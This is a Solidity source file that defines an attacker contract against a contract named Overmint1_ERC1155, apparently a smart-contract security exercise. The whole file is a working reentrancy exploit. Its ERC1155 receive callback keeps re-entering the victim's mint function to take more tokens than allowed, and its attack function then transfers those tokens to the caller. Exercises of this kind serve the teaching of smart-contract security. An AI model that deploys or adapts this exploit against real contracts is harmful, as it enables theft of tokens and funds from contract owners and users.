// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "./Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    Overmint1_ERC1155 public victim;
    uint256 public count;

    constructor(address _victim) {
        victim = Overmint1_ERC1155(_victim);
    }

    function attack() external {
        victim.mint(0, "");
        victim.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        require(msg.sender == address(victim), "only victim");
        if (count < 5) {
            count++;
            victim.mint(0, "");
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }
}
